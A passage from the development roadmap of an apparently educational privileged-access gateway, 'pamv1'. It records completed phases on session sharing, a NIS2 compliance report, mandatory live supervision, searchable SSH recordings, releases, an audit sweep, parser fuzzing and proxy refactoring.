  `Kind!="internal"` — an insider who somehow learned a vendor's token cannot
  redeem it under their own pamv1 credential instead of the intended
  email-anchored flow), and — **fail-closed** (`mustAuditAs`,
  `session.share_joined`, actor `guest:<email>`) — mints a *separate* guest
  key (`ShareRegistry.IssueGuestKey`, `PAM_SESSION_SHARE_GUEST_TTL_MIN=240`)
  the browser then uses repeatedly: `GET /api/share/stream?key=` (plain
  `EventSource` — guest auth is a query param, unlike the portal's own
  `fetch`-based workaround) and, `view_control` only, `POST
  /api/share/input?key=` writes the raw body into the session's input mux.
  Audit detail captures the invited email, source IP, user-agent, mode and
  session — the full connection trace the user's "we need trace of that
  connection" required.
- [x] **Roster + kick.** `GET /api/sessions/{id}/share/roster`
  (`CapReadAudit`) lists everyone attached; `POST
  /api/sessions/{id}/share/kick` (`CapManageTargets`, `{join_id}`) closes the
  channel `Track` handed that join at attach time — the SAME mechanism for
  an SSH `join:` connection and a web guest's SSE stream, so kick actually
  disconnects rather than merely deleting a roster row. Kicking a web guest
  also revokes its guest key (join id and guest key are the same string),
  closing the race where a request already in flight outlives the kick. New
  audit action `session.share_kicked` — not in the original design pass,
  added while building the console, which needed a real way to enforce a
  kick, not just record intent.
- [x] **Air-gap leak, found and closed during the doc-currency pass.**
  `buildAlerter` already forces the security-alert channel to a no-op under
  `PAM_OT_AIRGAP` — but `alert.SendDirect` (the new external-invite email
  path) dials SMTP directly and has no air-gap awareness of its own, so an
  air-gapped deployment with `PAM_ALERT_EMAIL_*` configured could still leak
  an invite email out of the enclave, silently defeating the one guarantee
  that flag exists to make. `shareEmailEnabled` now checks `!AirGap` first,
  refusing an external invite at request time (503, same as unconfigured
  SMTP) rather than only failing to send after approval.
- [x] **Console** (`internal/web/static/index.html`): the live-watch pane
  (*Work with Active Sessions* → option 5) gains a joined-parties roster
  with a kick option; F6 opens a small create-invite form (mode/kind/
  invitee-or-email); F7 opens the session's invite list (`stepups()`'s
  list-with-option-column shape: 5=Approve, 6=Deny, 7=Revoke). Added to
  `console_check.js`'s row-boundedness fixture (6 screens now).
- [x] **New audit actions** (8, one more than originally planned):
  `session.share_requested/approved/denied/revoked/joined/join_denied/ended/kicked`.
  `session.share_approved` and `session.share_joined` are the two
  fail-closed ones — an approval that is about to grant live access, and a
  redemption that uses it, are exactly the class of event
  audited-before-disclosure exists for.
- [x] **Tests**: `internal/session/share_test.go` (mux concurrency under
  `-race`, close-unblocks-writers, guest-key issue/resolve/expire/purge,
  kick disconnect + guest-key revocation, nil-registry safety — 13 tests);
  `internal/proxy/sessionshare_test.go` (JIT-style end-to-end against a real
  in-process echo upstream: view_control keystrokes reach the target and
  echo back through the primary's own stdout, view_only sees the primary's
  output, wrong-invitee/single-use/wrong-kind refusals, kick actually ends
  the joiner's SSH session — 6 tests); `internal/api/sessionshare_test.go`
  (four-eyes, deny-is-final, revoke gate, external-invite-needs-email-config,
  a full external flow against a real local fake SMTP server proving the
  email actually sends with the token embedded, wrong-kind refusal, roster +
  kick ending a live SSE stream, view-only input refusal, the web guest path
  ringing the same primary-operator join/leave notice the SSH path uses,
  `PAM_OT_AIRGAP` refusing an external invite even with SMTP fully configured
  — 10 tests);
  `internal/alert/channels_test.go` (MIME construction, header-injection
  defense, a real-wire `SendDirect` round trip against a fake SMTP listener —
  3 new tests). All green under `-race`; staticcheck/gosec/govulncheck clean;
  `archgen` confirms 131 → **142** routes, no undocumented drift.

**V1 scope, explicitly bounded**: SSH only (WinRM/PostgreSQL/RDP/VNC each
have a structurally different I/O shape). Cross-replica view-control
keystroke relay deferred, per-joiner (a same-replica-only refusal is honest,
mirroring `streamSession`'s own wording); cross-replica force-kick is
best-effort, mirroring session-kill's own pre-Phase-34 shape.

## Phase 115 — v0.21.0 ✅

Releases Phase 114 (a live NIS2 compliance report) — a genuine new
capability, so this is a **minor**, not a patch. No schema change.

- [x] **v0.21.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-13 as `ghcr.io/morandeirachema/pamv1:0.21.0` (also
  `latest`), digest
  `sha256:31a727e2875268c3c69ea9a4e183b608718ccdeed8874d68e85d20cbc01cfcff`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.11.0 -> **0.12.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated
- [x] `docs/README.md`'s currency line caught proactively this time — it went
  stale after both of the last two release-prep passes (v0.19.0, v0.20.0)
  because it carries no version pin any checklist watches

## Phase 114 — A live NIS2 compliance report ✅

The third Tier-5 finding from the 2026-08-12 CyberArk/Wallix research: "canned,
control-mapped reports, not just raw exports" — the same finding both research
passes rated tied for top priority with searchable recordings (Phase 110), and
the one this session's earlier "next" picked over in favor of the
live-supervision gate (Phase 112). Its own README description called it "a
query/formatting problem, not new instrumentation," and that held: no new
store method, no schema change.

- [x] **`GET /api/compliance/nis2?since=&until=`** (`CapReadAudit`) composes a
  report against the Art. 21(2) control matrix already documented in
  `docs/NIS2-COMPLIANCE.md` §1. Each control's `status` is architectural —
  whether the capability exists, mirroring the doc — not derived from window
  activity, so a quiet week doesn't read as a regression
- [x] **Evidence, not just status.** Controls with a natural audit signal
  (supply-chain (d), policy effectiveness (f), access control (i), MFA (j),
  incident handling (b)) additionally carry a count of matching events in the
  requested window, bucketed by the action's `family.verb` prefix — computed
  in Go from the existing `ExportAudit(since, until)` slice, not a new query
  path. Control (b) also carries `VerifyAuditChain`'s result, labeled
  `"whole-chain (bounded-range verification is not supported)"` rather than
  implying a window-scoped check the codebase cannot actually do — an honest
  limitation surfaced by the research (Q3 of the design investigation), not
  papered over
- [x] **Same conventions as every prior evidence export**: `X-PAM-Export-SHA256`
  over the exact delivered bytes, deterministic over a fixed window (no
  wall-clock field in the hashed body), self-audited (`compliance.nis2_report`),
  same `CapReadAudit` gate as the raw export and playback
- [x] **Deliberately narrow, not a PCI-DSS/ISO27001/SOX report generator.** The
  Tier-5 gap description named all four frameworks; only NIS2 is mapped here,
  because it is the one pamv1 already has a real, maintained control taxonomy
  for — inventing the other three from scratch, without domain expertise, for
  a security product, was judged the wrong tradeoff for an educational
  project. The control table (`nis2Controls` in `compliance_handlers.go`)
  mirrors `docs/NIS2-COMPLIANCE.md` §1 by hand, flagged in both places to keep
  them in step, matching how the audit-vocabulary doc and the code's action
  strings already relate
- [x] **Console: F8** from *Display Audit Trail* opens the report screen
  (since/until inputs default to the last 90 days); **F9** downloads the JSON.
  Extended `console_check.js`'s row-boundedness fixture to the new screen
  (Phase 110's own lesson applied again) — the evidence cell is marked
  `class="detail"` since its width genuinely varies with a real event count,
  not because it was assumed safe
- [x] No schema or route-count surprise beyond the one new route (130 → 131,
  confirmed by a clean `archgen` re-run)

## Phase 113 — v0.20.0 ✅

Releases Phase 112 (mandatory live-supervision gate) — a genuine new
capability, so this is a **minor**, not a patch. No schema change.

- [x] **v0.20.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-13 as `ghcr.io/morandeirachema/pamv1:0.20.0` (also
  `latest`), digest
  `sha256:ce01637e76be9acb2dd88e2c8cdb5d2bbfde76da59fc79ebff318fc00d35b421`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow). Keyless-signed with the SBOM and SLSA provenance as
  OCI referrers; the Release carries `sbom.spdx.json`
- [x] All five pins via the sweep; Helm chart `version` 0.10.0 -> **0.11.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated

## Phase 112 — Mandatory live-supervision gate (SSH) ✅

The second Tier-5 finding from the 2026-08-12 CyberArk/Wallix research,
closed the same day as Phase 110: a session can be required to have an
**actively-connected** supervisor before it proceeds, not just after-the-fact
review. Both halves already existed separately — the live watch hub (Phase
16, cross-replica-aware since Phase 55) and the pattern for a global-plus
fail-closed policy flag — so this is a gate over existing plumbing, not new
plumbing, exactly as flagged when the finding was recorded.

- [x] **`PAM_REQUIRE_LIVE_SUPERVISION`** (bool, default off) +
  **`PAM_LIVE_SUPERVISION_TIMEOUT_SEC`** (default 120): when set, an
  interactive SSH channel is held — *before* the upstream channel even opens,
  so nothing reaches the target — until `session.Hub.HasSubscribers` reports
  a watcher (polled every 500ms; the check is already cross-replica via the
  Phase 55 relay, so a supervisor watching from a different pod counts) or
  the timeout elapses. On timeout the channel is refused and the refusal is
  audited `session.unsupervised`, with the operator told why over the same
  channel rather than left to guess at a hang
- [x] **Two deliberate exemptions**: an observer (`+observe`) session, since
  it already **is** the watching role — requiring it to also be watched would
  be circular — and break-glass, since an emergency key exists precisely for
  when no supervisor is reachable and gating it on one would defeat the
  purpose. Both are proven, not just asserted: dedicated tests confirm
  neither waits
- [x] **Scope, honestly bounded**: SSH only. PostgreSQL and SQL Server
  sessions already have a different human-in-the-loop mechanism for the same
  underlying concern — the in-session step-up pause (Phase 30/56), which
  gates a *flagged statement* mid-session rather than the whole session at
  connect time — and reusing that bus for "wait for ANY watcher to attach to
  a session that doesn't exist yet" turned out to need a structural change
  (registration happens after the credential already dials the real target)
  with no existing precedent to build on safely in the same phase. A per-target
  or per-safe override (matching `RequireApproval`'s strictest-wins shape) is
  a natural follow-on, deferred rather than guessed at
- [x] Tests: off-by-default (no regression for deployments that never set the
  flag), timeout-refuses (+ audited), releases the moment a supervisor
  subscribes (well before the timeout — the common case), and both
  exemptions proven to never wait at all
- [x] No schema or route change; `archgen` output unchanged (two new env vars
  only)

## Phase 111 — v0.19.0 ✅

Releases Phase 110 (searchable SSH session recordings) — a genuine new
capability, so this is a **minor**, not a patch. No schema or env-var change.

- [x] **v0.19.0** through the test-gated pipeline, rehearsed on `main` first
- [x] All five pins via the sweep; Helm chart `version` 0.9.2 -> **0.10.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated

## Phase 110 — Searchable SSH session recordings ✅

Closes the strongest finding from a 2026-08-12 competitive-research pass
against CyberArk PAM and Wallix Bastion (two independent research passes,
each fact-checked against this repo, converged on it separately): neither
leaves an auditor scrubbing through a session to find something — CyberArk
OCR/text-indexes recordings, Wallix does the same for its DVR-style capture.
pamv1's SSH recordings were already the easy half of that gap, since
asciicast is plain text on disk; this phase is that half, done honestly. The
other eight findings from the same research pass are recorded as new open
rows in [README.md's competitive-coverage table](README.md#coverage-vs-commercial-pam-cyberark-wallix-)
rather than built speculatively.

- [x] **`recording.SearchASCIICast`** reconstructs an asciicast recording's
  output stream (bounded, so one long session cannot make a query hold
  unbounded memory) and searches it case-insensitively — reconstructed, not
  grepped line by line, because interactive terminal output arrives in
  whatever chunks the network and the target's own echo produce, often a
  handful of bytes at a time, so a query spanning more than one such chunk
  would never match within a single asciicast event's data field. Works
  transparently over a sealed (Phase 41) recording via the existing `Open`
  entry point, with no crypto awareness of its own. A read error other than a
  clean or torn-tail EOF — in particular a sealed recording that fails AEAD
  authentication — is returned rather than swallowed, so a tampered file
  reports as an integrity failure, never silently as "no matches"
- [x] **`GET /api/recordings/search?q=`** (`CapReadAudit`, the same capability
  that already lists and plays back every stored recording, so search
  discloses nothing new — only finds it faster) scans the newest 500 `.cast`
  files, reports each match's count, a sanitized snippet (ANSI escapes and
  control bytes stripped) and — the part that makes a hit actionable rather
  than informational — the asciicast time the match starts at, resolved from
  a table of event-boundary timestamps built during reconstruction. Owning
  target/actor resolve from the audit trail exactly as the plain listing
  already does. Audited `session.search` with the query itself (the sensitive
  fact, independent of whether it hit anything) — fail-closed per invariant
  §6.4, audited immediately before the results are disclosed rather than
  before scanning, so the one row also carries what the query found
- [x] **Console**: F4 from *Session Recordings* opens a search screen; a hit's
  option 5 replays the recording seeked to the match (`replaySeekTo` fast-
  forwards synchronously through frames to that time, landing paused with the
  match already in view, then Space resumes ordinary playback from there —
  no new player primitive, the existing frame-accumulation loop run without
  its per-frame delay)
- [x] **A real, unrelated bug found while extending the console's own
  safety-net test** (`console_check.js`, Phase 71) **to cover the new
  screen**: `pad()` only adds padding, it never truncates, so the *existing*
  recordings list's target/actor columns were unbounded despite looking
  bounded — the exact failure class that test exists to catch, just never
  pointed at this screen. Both the list and the new search screen now use
  `cell()` (truncate-then-pad), which the test enforces. Also fixed in the
  same pass: the test's detail-cell exclusion regex required an exact
  `class="detail"` match, silently failing to exclude the `class="detail
  amber"` / `class="detail cyan"` cells already in use elsewhere — widened to
  `class="detail[^"]*"`
- [x] Scope, stated rather than implied: RDP/VNC (guacd's native binary
  protocol, no text layer — OCR is a real follow-on) and WinRM transcripts
  (plain text, but out of scope for this pass) are not searched. No schema,
  env-var or existing-route change; `archgen`'s route count moves 129 → 130

## Phase 109 — v0.18.2 ✅

Releases the 96–108 refactor/hardening/docs arc — thirteen phases that had sat
on `main` unreleased since v0.18.1 (2026-08-09) — plus four routine dependency
bumps merged alongside it (a GitHub Action, the two distroless base images, and
an `aws-sdk-go-v2` patch group). Two real fixes travel in this release, both
from Phase 108: the PostgreSQL/SQL Server proxies no longer double-audit a
refused connection, and `PUT /api/targets/{id}` can no longer strand a Zero
Standing Privilege credential. Everything else in 96–108 is refactor, test,
tooling and documentation work that changed no user-facing behaviour,
protocol, port or env var.

- [x] **v0.18.2** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-12 as `ghcr.io/morandeirachema/pamv1:0.18.2` (also
  `latest`), digest
  `sha256:8f93a6769e604824327ee31743afcb5f30c024df0b2e1ee63da1ca00e2759e00`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow). Keyless-signed with the SBOM and SLSA provenance as
  OCI referrers; the Release carries `sbom.spdx.json`
- [x] All five pins via the sweep; Helm chart `version` 0.9.1 -> **0.9.2**
- [x] Both READMEs restated
- [x] Fixed a stale-digest bug this pass turned up: `README.md`'s "Verifying a
  release" section had been carrying `v0.14.1`'s digest under whatever version
  label was current since at least v0.15.0 — every digest-recording commit
  before this one updated `ROADMAP.md` only, never that section

## Phase 108 — The 2026-08-12 audit sweep ✅

Phase 107 closed the "What is left" backlog entirely, so this phase started
from nothing: four independent read-only passes over the codebase — cross-path
control parity, test coverage in security-critical code, a fresh security
self-audit, and doc-vs-code currency — each instructed to report only
verified, file:line findings and say so plainly if a slice was clean. All four
came back with real findings; none were manufactured to have something to
report. Closed in one pass, since all seven came out of the same sweep:

- [x] **The PostgreSQL and SQL Server proxies wrote two contradictory
  `db.session.denied` rows for one refused connection**, on exactly two of
  fourteen admission gates (a tunnel-scoped viewer token, an MFA-enrollment-only
  session). `refuse()`'s `gateTunnelOnly`/`gateEnrollOnly` cases audited the
  denial explicitly and then called `deny()`, which independently audits the
  same action via `sqlDeny` — so one refusal left two rows with two different
  `reason:` strings (the explicit call omitted the per-statement `queryTag()`
  the `deny()` path always includes). It predates Phase 102: the unification
  preserved it faithfully from both proxies' pre-refactor code, so it is a
  genuine, previously unrecorded defect, not a regression. It matters because
  `db.session.denied` feeds the risk-analytics engine's `authFailActions`
  signal and is OCSF-classified for SIEM export — a doubled count skews both,
  and a self-contradictory trail is exactly the audit-fidelity defect class
  `docs/SECURITY-GAPS.md` treats as first-class. Fixed by auditing once (with
  the short reason slug already shared by the SSH proxy and the HTTP authz
  middleware for the same two conditions) and failing the wire directly,
  matching the pattern every other gate in the same switch already used to
  avoid a double write. **Regression-pinned**: `TestDBProxyRefusesTunnelOnlyToken`
  and `TestDBProxyEnrollOnlyRejected` now assert exactly one `db.session.denied`
  row, and a new `TestMSSQLProxyRefusesTunnelOnlyToken` (the SQL Server proxy had
  no tunnel-only test at all) joins `TestMSSQLProxyEnrollOnlyRejected` in the
  same assertion. `TestSSHProxyRefusesTunnelOnlyToken` pins its sibling path was
  never affected
- [x] **An `ssh_ca` (Zero Standing Privilege) credential could be stranded on a
  target retargeted away from ssh.** `POST /api/credentials` refuses to create
  one unless the target's protocol is `ssh`; `PUT /api/targets/{id}` never
  re-checked that invariant, so an admin could create the credential, then
  change the same target's protocol to `winrm` — after which the credential's
  empty `SecretEnc` (ZSP stores no secret; the SSH proxy mints a certificate
  JIT) would reach a WinRM path with no certificate to mint and no secret to
  inject. `updateTarget` now refuses the protocol change while any `ssh_ca`
  credential exists on the target (`hasZSPCredential`, mirroring the create-time
  check), the same plain-422 shape as every other `validateTargetIn` rule — not
  an audited denial, since this is shape validation, not authorization. New
  `TestZSPCredentialBlocksProtocolChange` proves the refusal, that the target's
  protocol did not partially change, and that the same update succeeds once the
  credential is gone
- [x] **Three untested fail paths in security-critical code.** `mfaVerify`'s own
  `mfa.Validate` rejection (confirming an MFA enrollment) had zero test
  executions — both existing calls to `POST /api/mfa/verify` submitted a
  correct code, so a regression here could let any string confirm a TOTP
  secret. `vault.NewTransitKEK`'s HTTPS-enforcement guard had never seen its
  rejection branch fire — every test server is `http://127.0.0.1`, which the
  loopback exemption always allows, so the actual "reject a non-loopback
  `http://` address" branch was unexercised. `internal/proxy`'s `md5Password`
  (PostgreSQL MD5 upstream auth — still common in real `pg_hba.conf` configs)
  had no test at all, unlike its cleartext and SCRAM-SHA-256 siblings. Closed
  with `TestMFAEnrollmentAndLogin`'s new step (wrong OTP at `/api/mfa/verify`
  must 401 and must not confirm the enrollment), `TestNewTransitKEKRequiresHTTPS`
  (rejects a non-loopback `http://` addr, still exempts loopback), and
  `TestMD5Password` (three vectors computed independently in Python, plus a
  salt-is-mixed-in check)
- [x] **Two functions dead since Phase 42, one dead since before the
  multi-group-union work.** `proxy.GenerateHostKey`/`LoadOrCreateHostKey` (the
  file-based host-key path Phase 42's `keycustody` replaced) had zero callers
  for roughly 15 phases — Phase 96 deleted their exact sibling,
  `sshca.LoadOrCreate`, in the same commit that introduced `keycustody`, and
  missed this one. `auth.HighestRole` was a thin `MatchedRoles` wrapper with no
  production caller (LDAP/Entra/OIDC all call `MatchedRoles` directly for the
  union-of-roles behavior); its own test exercised only the wrapper, so
  deleting it moved the case-insensitive-match assertion it uniquely covered
  into `TestMatchedRoles` rather than losing it. Both doc comments had also
  gone stale (one still described file persistence Phase 42 removed
  operationally; the other named three callers that were never `HighestRole`'s)
- [x] **Audit-vocabulary and config-doc drift**, the same class Phase 65 closed
  for a different set of actions: `gateCredentialAccess` (the shared gate behind
  reveal, checkout, rotate, reconcile, app grants and SSH cert issuance) audits
  every denial as `<action>_denied`, but `docs/ARCHITECTURE-LOW-LEVEL.md` §5
  listed only two of the six real strings — `ssh.cert_issue_denied`,
  `app.grant_denied`, `credential.rotate_denied` and `credential.reconcile_denied`
  were genuinely emitted and undocumented. §4's Conjur row used the table's
  usual `X` / `_SUFFIX` shorthand for `PAM_CONJUR_AUTHN_LOGIN`/`_API_KEY` and
  `PAM_CONJUR_AUTHN_JWT_SERVICE_ID`/`_JWT_FILE` — but the code reads
  `PAM_CONJUR_API_KEY` and `PAM_CONJUR_JWT_FILE` (no `AUTHN`), so the shorthand
  silently implied two variables the code never reads. An operator configuring
  Conjur from the doc alone would set the wrong name and get silent non-sourcing
  instead of an error
- [x] No schema, route, wire-format or env-var change; behaviour is unchanged
  except the two fixes above (one denial audited once instead of twice; a
  protocol change refused while it would have stranded a ZSP credential).
  `archgen` output unchanged

## Phase 107 — Documentation currency pass ✅

The refactor/hardening arc (96–106) kept the per-phase change-log tables current
in the docs it touched but let the cross-doc currency markers drift — the same
lag Phase 95 corrected for the 71–94 arc, caught here by a doc-vs-code audit.

- [x] **Every `Reflects: Phases 0–N` header now says 0–107 / 2026-08-10.**
  Eighteen docs still read 0–94 (SECURITY-GAPS read 0–96); their bodies were
  accurate — 96–107 were internal refactors, tests, tooling and docs that changed
  no user-facing behaviour, protocol, port or env var — but the markers asserting
  currency had not been bumped
- [x] **The summary narratives caught up too**: the ROADMAP header ("Phases 0–107
  are shipped", with a one-paragraph gloss of the 96–107 arc) and both READMEs'
  phase counts (`0–94` → `0–107`, EN and ES), which the per-phase change-log
  tables had outpaced
- [x] **ARCHITECTURE-HIGH-LEVEL's change log gained the five missing phases**
  (101, 103, 104, 105, 106); the low-level log and CODE-GUIDE were already complete
- [x] **CODE-GUIDE's CI-gate list now names the `fuzz smoke` step and the
  enforced `gosec` `G304`/`G101`** added in 103–104
- [x] **SECURITY-GAPS records the two security findings from the sweep**: the
  Phase 102 per-connection-map leak a hand review caught (finding CF), and the
  103/104 fuzzing + gosec-enforcement hardening — and its header caught up to 0–107
- [x] Docs-only; no code, schema, route or env-var change, so the `archgen`
  output is untouched and no release is needed

## Phase 106 — Deferred-cleanup backlog: the one that earned its keep ✅

Working through the "deferred cleanups" backlog and being honest about which
were worth doing. One was; the rest, on inspection, were churn with wrinkles.

- [x] **`"ssh_ca"` magic string → `store.SecretTypeSSHCA` + `Credential.IsZSP()`.**
  The Zero Standing Privilege type was compared as a bare string literal at
  thirteen behavioural sites across the proxy and the API — and every one guards
  a **secret-delivering path** (decrypt, reveal, rotate, check-out, dial). A
  typo (`"sshca"`) in a new such path would silently read as *not* ZSP and try to
  decrypt an empty secret. Now a named constant and predicate: `SecretTypePassword`
  / `SecretTypeSSHKey` / `SecretTypeSSHCA`, and `c.IsZSP()`. Test
  `store.TestCredentialIsZSP` pins the predicate and that a near-miss is not ZSP
- [x] **Evaluated and deliberately skipped** (each a wash or worse on inspection,
  not left on a wishlist):
  - a `deleteByID` handler factory — the six delete handlers **diverge in
    audit-detail format** (three write a bare id, three `entity:id`), so a
    factory needs a per-route formatter closure that is as much code as it removes
  - a `credAndTarget` helper — the `GetCredential` sites are **not uniform**
    (several fetch a *management* credential, not a target), so it does not apply
    cleanly
  - extracting the remaining pgstore anonymous scanners — they are **single-use**
    (naming adds nothing), and the one apparent duplicate (`TargetGrant`)
    legitimately differs in projection (`EffectiveTargetGrants` omits
    `CreatedBy`); the real duplicate, `AuditEvent` ×3, was unified in Phase 99
  - the vendor lookup N+1 — a real inefficiency, but on a **low-frequency
    admin-list path**, and fixing it means adding `GetVendor`/`GetVendorGrant` to
    the store interface + both implementations + the conformance suite: a
    disproportionate change, left as a noted follow-on
  - wrapping the 1,900-line `storetest` in `t.Run` subtests — high churn for
    failure-isolation only
- [x] Behaviour-preserving (a named constant/predicate for the same stored
  value); no schema, route, wire-format or env-var change; archgen unchanged

## Phase 105 — Config-validation test hardening ✅

`internal/config` is the sole validator of the ~200 `PAM_*` environment
variables and their cross-field rules, at a 0.35 test ratio — a rule that
silently stopped rejecting a bad value would let a fat-fingered setting disable a
security control (throttling off, retention deleting, an enum falling back to its
permissive default), invisibly.

- [x] **`TestLoadRejectsBadValues`** — a table of seventeen cases covering the
  validation rules the existing tests did not reach: the SFTP/RDP/audit-forward
  enums, the analytics/conjur/cert/retention bounds, the session/broker rate
  floors, the SVID token-exchange dependency chain, the inverted business-hours
  window, and the too-short ZSP certificate TTL. Each sets the minimal valid
  baseline plus one bad variable and asserts `Load` reports it
- [x] **`TestLoadAcceptsRichValidConfig`** — the positive guard a purely negative
  suite cannot give: a configuration that drives the enums and bounds at
  non-default values and turns on the enable-gated blocks (audit forwarding, the
  full SVID chain) must pass, so a rule that starts *false-rejecting* a valid
  setting is caught
- [x] Test-only; no production code, schema, route or env-var change; archgen
  unchanged. (The `internal/session` cross-replica step-up audit flake this pass
  surfaced was fixed alongside Phase 104.)

## Phase 104 — Enforcement tooling: gosec tightened, golangci-lint evaluated ✅

Turn suppression back into enforcement, and evaluate a broader linter honestly
rather than bolt on noise.

- [x] **`G304` (tainted file path) and `G101` (hardcoded credential) are now
  enforced** — dropped from the gosec exclude list in CI and `CLAUDE.md`. The
  nine real `G304` file-read sites gained a per-site `#nosec G304 -- <reason>`
  (all operator-configured paths, build-tool paths, or a validated-then-joined
  recording name); `G101` fired nothing new. The value is forward-looking: a
  *new* read of an attacker-controlled path — say a filename straight off an
  HTTP request — now fails the build instead of passing silently
- [x] **golangci-lint evaluated, deliberately not adopted as a gate.** Installed
  v2 and ran a curated value-add set (`ineffassign`, `bodyclose`, `noctx`,
  `unconvert`, `nilerr`, `misspell`, `rowserrcheck`, `sqlclosecheck`). It surfaced
  39 findings; **every one was verified to be test-file noise or a deliberate,
  well-commented pattern** — all ten `nilerr` hits are correct idioms
  (graceful-shutdown-returns-nil, copy-loop-on-EOF, an error converted to a
  domain result), `bodyclose` was tests only, `noctx` mostly tests plus
  intentional context-free dials. Adopting it as a CI gate would mean annotating
  ~40 intentional sites for **zero** defect-catching benefit over the existing
  `staticcheck`/`gosec`/`govulncheck`/`vet` gates, because the codebase is already
  clean under them. The one actionable output — two unnecessary type conversions
  (`unconvert`) — is fixed directly
- [x] No schema, route, wire-format or env-var change; behaviour unchanged
  (annotations + two no-op conversion removals); archgen unchanged

## Phase 103 — Fuzzing the wire parsers ✅

The proxies parse ~2,900 lines of attacker-influenced bytes straight off an
operator's connection, and the tree had **zero fuzz tests**. A parser that panics
or hangs on a malformed packet is a denial of service on the gateway — and the
SFTP inspector is a *containment* control that must not be evadable by a
malformed packet. This adds Go native fuzzing for those paths.

- [x] **`internal/tds`**: `FuzzParsePreLogin`, `FuzzParseSQLBatch`, `FuzzParseRPC`
  — the three byte-slice entry points (the PRELOGIN option table with its
  attacker-chosen offsets/lengths, the SQL-batch UCS-2 text, and the RPC parser
  that walks batched calls and recovers SQL from typed parameters). PreLogin also
  asserts an encode round-trip
- [x] **`internal/proxy`**: `FuzzSFTPInspector` drives `sftpInspector.handlePacket`
  across both read-only and allow modes (capture and the path guard nil, so no
  filesystem side effects)
- [x] **Result: the parsers held.** ~2M executions across the four targets found
  no panic and no hang — the existing bounds-checks and forward-progress guards
  are sound. No production code changed; this is coverage, not a fix
- [x] The seed corpus runs as a normal test in the existing `go test` job (the
  regression guard — a reintroduced crasher fails the build), and a new
  **fuzz-smoke CI step** additionally fuzzes each target ~20s per run to hunt for
  new ones. `archgen` unchanged; no schema, route or env-var change

## Phase 102 — Proxy-family structural unification ✅

The three session proxies (SSH `proxy.go`, PostgreSQL `dbproxy.go`, SQL Server
`mssqlproxy.go`) had three large blocks of near-verbatim triplication: the
listener lifecycle, the per-statement pipeline (the DB pair), and the
admission-gate sequence. Each proxy said the same thing three ways and differed
only in how it said no — the exact shape that produced the Phase 96 bugs. This
writes each once. Behavior is preserved exactly; the only intended change is the
one latent divergence noted below. Net **−488 lines**. Built with a multi-agent
workflow (implement → adversarial-verify each step) and then reviewed by hand,
which is how the leak below was caught.

- [x] **Listener lifecycle → one embedded `listener`** (`listener.go`): the
  verbatim `serve`/`trackConn`/`untrackConn`/`closeActiveConns`/`fireSessionEnd`/
  `audit`/`auditClosing` (accept-backoff, bounded drain, straggler-close) now
  live once and are embedded in all three proxies; each keeps only its own
  "listening"/"accept error" log strings, its default audit actor
  (`proxy`/`dbproxy`/`mssqlproxy`, via a `component` field) and — for SSH — the
  bound-listener `Addr()`. Pinned by the existing `teardown_test`/`hardening_test`
- [x] **DB per-statement pipeline → `sqlPolicy` + `sqlClient`** (`sqlproxy.go`):
  the record/audit/live + step-up + blocked + deny logic is shared; each proxy
  supplies only its wire refusal encoder (pgproto3 vs `tds.Refusal`) and prompt.
  Every audit action, the `auditCmd`/`auditField` bounding, and PostgreSQL's
  extended-protocol fail-closed branch are preserved unchanged
- [x] **Admission gates → one `admit()`** (`gates.go`): the fixed thirteen-gate
  sequence (tunnel-only → MFA → CapConnect → resolve → exact-protocol → allowlist
  → per-target grants → approval → vendor → proxyable → session cap → fail-closed
  session-start audit → JIT decrypt) runs once and returns a typed
  outcome/gate/reason; each proxy maps it to its own refusal wording. The three
  genuine per-proxy variations are narrow hooks (`expectProtocol`, `proxyable`,
  `skipDecrypt`, `startAudit`). The grep-based `dbproxy_parity_test.go` drift
  alarm is replaced by behavioral coverage: `TestAdmitDeniesEachGate` drives
  every gate's denial, and `TestDBRelayGatesStayInSync` (now comment-stripped, so
  a gate merely mentioned cannot stand in for one enforced) keeps the DB pair honest
- [x] **Latent divergence fixed** (behavior-identical today): the SSH path now
  passes the **real** `*auth.Principal` to `CanConnectTarget` instead of a partial
  `{Name, Role, Roles}` reconstruction, plumbed from `authenticate` to
  `handleConn` through a per-connection token. Should a grant check ever become
  capability-aware, SSH no longer silently diverges from the other paths
- [x] **Found in hand review** (not by the verifiers): that per-connection token
  map could leak an entry when authentication succeeded but the SSH handshake
  then failed before `handleConn` consumed it. A stale-entry sweep in
  `authenticate` now bounds the map to in-flight handshakes — the original code
  had no such map, so this closes the growth vector the mechanism introduced
- [x] All gates green (gofmt, vet, staticcheck, govulncheck, gosec, `go test
  -race`, archgen — no drift); no schema, route, wire-format or env-var change,
  and no audit-action or refusal-encoding change

## Phase 101 — Test hygiene: a bounded poll helper ✅

The recurring shape across the suites is a hand-rolled `deadline := time.Now();
for !cond { if After(deadline) { t.Fatal }; time.Sleep(…) }`. This gives it one
home so a poll can no longer be written without a bound.

- [x] **New `internal/testutil.WaitFor(t, timeout, cond) bool`** — polls every
  ~5ms until cond holds or the timeout elapses; the caller supplies its own
  failure message. Imported only by test files, so its `testing` dependency never
  reaches a production binary
- [x] **The highest-traffic poll loops now use it**: `proxy`'s `waitForAudit`
  (shared by many session tests), `session`'s `waitPending`, and the
  cross-replica interest/expiry loops in the live-bus tests. Each keeps its exact
  timeout and failure message — the behavior is identical, only the boilerplate
  is gone
- [x] Left as-is on purpose: the fixed-count repetitions that are *not* waits
  (e.g. "publish five forged announcements, then assert the gate stayed shut")
  and the channel `select { …; case <-time.After(…) }` waits, which are already
  bounded and are not the poll shape
- [x] `t.Parallel` was considered and **not** rolled out: the leaf packages are
  already sub-second (parallelising within them saves nothing, since packages run
  concurrently already), and the two suites that would benefit — `internal/api`
  and `internal/proxy` — share `httptest` servers and fixtures that need a
  per-test audit before they can run in parallel safely. A larger, separate pass
- [x] New `testutil` node in the archgen diagram (test-only package); no schema,
  route, wire-format or env-var change

## Phase 100 — Wiring readability: extracting builders from run() ✅

`cmd/pam-server`'s `run()` was ~790 lines of dense startup wiring. This lifts the
